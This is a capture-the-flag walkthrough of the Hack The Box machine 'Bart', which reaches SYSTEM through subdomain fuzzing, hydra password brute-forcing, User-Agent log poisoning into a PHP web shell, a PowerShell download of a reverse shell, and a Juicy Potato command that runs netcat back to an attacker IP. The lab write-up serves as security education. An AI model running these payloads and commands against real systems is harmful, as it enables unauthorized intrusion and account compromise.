# Recon

I do my initial scan to see which ports are open.

## nmap
```
# Nmap 7.92 scan initiated Fri Aug 19 17:44:03 2022 as: nmap -p- -oA first/scan --min-rate 5000 --max-retries 3 --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -vv bart.htb
Nmap scan report for bart.htb (10.129.96.185)
Host is up, received echo-reply ttl 127 (0.057s latency).
Scanned at 2022-08-19 17:44:03 CDT for 26s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Aug 19 17:44:29 2022 -- 1 IP address (1 host up) scanned in 26.61 seconds
```

Then run `nmap` again with default scripts (`-sC`) and service discovery (`-sV`) on the ports that were found from the first scan.

```
# Nmap 7.92 scan initiated Fri Aug 19 17:44:43 2022 as: nmap -oA main/scan -sV -sC --min-rate 5000 --max-retries 3 --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -vv -p 80 bart.htb
Nmap scan report for bart.htb (10.129.96.185)
Host is up, received echo-reply ttl 127 (0.066s latency).
Scanned at 2022-08-19 17:44:43 CDT for 9s

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Did not follow redirect to http://forum.bart.htb/
|_http-favicon: Unknown favicon MD5: 50465238F8A85D0732CBCC8EB04920AA
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 19 17:44:52 2022 -- 1 IP address (1 host up) scanned in 9.09 seconds
```

We see IIS 1.0 is running on port 80 and that seems to be it for the services. We also see that it looks like nmap caught a redirect to `forum.bart.htb`, so I'll be sure to enumerate for other subdomains, but first we should add this domain to our `/etc/hosts` so that hopefully our redirect to the forum sub-domain will work.

![e36f175cfce5c695c2f5ee07b0a522a0.png](../_resources/e36f175cfce5c695c2f5ee07b0a522a0.png)



# wfuzz

I first run the following command to get the normal word count from my requests:
`wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST: FUZZ.bart.htb" -u http://bart.htb -t 90`

And find that the normal word count seems to be 0:

![9bb789d0a3c91508986b61a8cec77e52.png](../_resources/9bb789d0a3c91508986b61a8cec77e52.png)

I then specify to hide all results with wordcount 0 by adding `--hw 0` which eventually returns valid subdomains of `forum` and `monitor`.

```
Target: http://bart.htb/
Total requests: 19966
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00023:  C=200    548 L	    2412 W	  35529 Ch	  "forum - forum"
00099:  C=200     80 L	     221 W	   3423 Ch	  "monitor - monitor"
09532:  C=400      6 L	      26 W	    334 Ch	  "#www - #www"
10581:  C=400      6 L	      26 W	    334 Ch	  "#mail - #mail"

Total time: 0
Processed Requests: 19966
Filtered Requests: 19962
Requests/sec.: 0
```


# Website

## forum.bart.htb and bart.htb/forum

Looking at the page source code for `forum.bart.htb` we find quite a few possible users, including a peculiar section of commented out code for Harvey Potter who appears to be one of the devs. 

![mailto-users.png](../_resources/mailto-users.png)

```
Samantha Brown
s.brown@bart.local

Daniel Simmons
d.simmons@bart.htb

Robert Hilton
r.hilton@bart.htb

Harvey Potter
h.potter@bart.htb
```

We also find the WordPress version running on the server but unfortunately `wpscan` wasn't helpful since the WordPress installation seems to be modified in an unusal way.

![forum-dir.png](../_resources/forum-dir.png)

## monitor.bart.htb and bart.htb/monitor

There is a basic web form for authentication.

![112e696f0c46eefd6c699b1406d74957.png](../_resources/112e696f0c46eefd6c699b1406d74957.png)

![29479ea2b374c2d4fd8373a4c6dcd882.png](../_resources/29479ea2b374c2d4fd8373a4c6dcd882.png)

I try testing some logins with possible usernames and fake passwords in hopes that the application reveals too much info to indicate valid usernames or not.

![be16df24f072e3db59e4819a91e89aff.png](../_resources/be16df24f072e3db59e4819a91e89aff.png)

The error messaging for login attempts doesn't help, but if we try to enumerate possible users the same way using the "Forgot Password?" feature, we actually see that the error lets us know if a username exists or not.

![a5862615f7d97275fe1bb568c0ca4b17.png](../_resources/a5862615f7d97275fe1bb568c0ca4b17.png)

![ebca88264c86b602ce7596192366da03.png](../_resources/ebca88264c86b602ce7596192366da03.png)

![3a373f9f76533838209bbff92227a60a.png](../_resources/3a373f9f76533838209bbff92227a60a.png)

We find that `harvey` and `daniel` are valid users. At this point, brute forcing passwords might be possible since the form doesn't lock us out or ban us. Before using `hydra`, I intercept a login attempt using `Burp` to get the form data.

![29feaaadbfeb56483f211d3dbeb91154.png](../_resources/29feaaadbfeb56483f211d3dbeb91154.png)

Normally any csrf token is going to make things difficult for brute forcing but, I try using the same token for `hydra` anyways:

`hydra -l harvey -P /usr/share/wordlists/rockyou.txt monitor.bart.htb -o results.txt http-post-form "/:csrf=d6320a2c5140361e7466716393591867a2db0e51d141881793a7d4ec8c87ceaf&user_name=^USER^&user_password=^PASS^&action=login:The information is incorrect.:H=Cookie: PHPSESSID=ofs4jivi8bublqu5pthc2fkvvp"`

This works and we find `harvey:potter`.

![brutesuccess.png](../_resources/brutesuccess.png)

After logging in, I poke around a bit and find another domain of `internal-01.bart.htb`. I add this to my `/etc/hosts` file and check it out...

![internal.png](../_resources/internal.png)

![internal-server.png](../_resources/internal-server.png)

## internal-01.bart.htb

Another login form! When testing login attempts, we see that this form has an error for any passwords under 8 characters. This form does not have a csrf token and since we know Harvey is one of the devs, I'll go back to `hydra` once again while making sure to specify both possible error messages.

![fail-login-internal.png](../_resources/fail-login-internal.png)

![fail-login-internal2.png](../_resources/fail-login-internal2.png)

We then find `harvey:Password1` for this subdomain. 

![brutesuccess2.png](../_resources/brutesuccess2.png)

After authenticating we are brought to a chat thing of some sort.

![internal-chat.png](../_resources/internal-chat.png)

There is a "Log" link towards the top right of the page which doesn't really seem to do anything other than saying "Done." I intercept this request in `Burp` to see what is happening and find that it is requesting `log.txt` . 

![log-click.png](../_resources/log-click.png)

![burp-log-internal.png](../_resources/burp-log-internal.png)

We might be able to do some sort of LFI/RFI -> RCE, so I do a directory traversal and find we get a helpful error back but there are permission issues. I'll come back to this later.

![burp-log-internal-mod.png](../_resources/burp-log-internal-mod.png)

Looking at the page source for `simple_chat/login_form.php` we find there is some code doing some stuff, along with a GET to `http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey`

![internal-chat-source.png](../_resources/internal-chat-source.png)

After making some requests, I see that our User-Agent is being logged which means we might be able to poison the log.

![internal-log.png](../_resources/internal-log.png)

After sending `<?php phpinfo() ?>` in the User-Agent to `/log/log.php?filename=log.php&username=harvey` , I then do GET to `/log/log.php?filename=log.txt&username=harvey` and see that this works!

![log-poison.png](../_resources/log-poison.png)

Now that we know we can inject our own PHP, I'll try for a super basic web shell by replacing the User-Agent to `<?php echo system($_GET['cmd']); ?>`. I send this the same way and confirm this works.

![internal-webshell.png](../_resources/internal-webshell.png)

With our web shell, I will then use `Powershell.exe` to download and execute `Invoke-PowerShellTcp.ps1` which will be my reverse shell from this repo:
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

![1ba5f2f68c8ba50dc1f26ff19763b6e5.png](../_resources/1ba5f2f68c8ba50dc1f26ff19763b6e5.png)

![86b2c87451482e6a5507dd18309388e5.png](../_resources/86b2c87451482e6a5507dd18309388e5.png)

We get a shell back as `nt authority\iusr` -- the IIS service account!

![a032fbcde47a002ab16a6fd9cea16936.png](../_resources/a032fbcde47a002ab16a6fd9cea16936.png)

We also see that `SeImpersonatePrivilege` is enabled which means Juicy Potato is likely a good candidate to escalate our privileges to SYSTEM.

![se-impersonate-priv.png](../_resources/se-impersonate-priv.png)

Before doing that, I wanted to look at the php source code for `log.php` to better understand the log poisoning vulnerability. We see there is a variable `$userAgent` which gets assigned the User-Agent of the person making a request to `log.php`. This value later gets assigned to `$string` which will then be used as a parameter for the `file_put_contents()` function. 

![bad-code.png](../_resources/bad-code.png)

Back to Juicy Potato... In order to get this working, I will download not only Juicy Potato on the box, but also Netcat to be used as part of the privilege escalation process.

JuicyPotato: https://github.com/ohpe/juicy-potato
Netcat64: https://github.com/int0x33/nc.exe/

![720c370581e8288aee7aa80743095d0b.png](../_resources/720c370581e8288aee7aa80743095d0b.png)

I will use the following Juicy Potato command to achieve privilege escalation to SYSTEM.

`.\jp.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c c:\users\public\documents\nc64.exe -e cmd.exe 10.10.14.64 9999" -l 1234 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"`

Information about the flags that were used can be found from JP documentation, although I will briefly explain:

`-l 1234`: Use arbitrary DCOM port 1234.

`-p "C:\Windows\System32\cmd.exe"`: Tell JP to use `cmd.exe` as the main program for this.

`-a "/c c:\users\public\documents\nc64.exe -e cmd.exe 10.10.14.64 9999"`: This is the command that defines which arguments should be passed to `-p` which in our case is `cmd.exe`. To be specific, we are telling `cmd.exe` to execute `nc64.exe` with elevated privileges and execute our reverse shell which we will catch on a new netcat instance listening on port 7331.

`-t *` try both `createprocess` calls (`<t> CreateProcessWithTokenW, <u> CreateProcessAsUser)`

`-c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"`: This is the CLSID I found from JP's documentation here (Note: it took a few tries to find a CLSID that worked):

![bea56f74ef752d5188718ebaf8806b83.png](../_resources/bea56f74ef752d5188718ebaf8806b83.png)

This works and we get a shell back on our as Netcat listener as `nt authority\system`!

![12b97c6860963afec5aede4e3f1bde69.png](../_resources/12b97c6860963afec5aede4e3f1bde69.png)

We collect our loot and move to the next box. :)

![loot.png](../_resources/loot.png)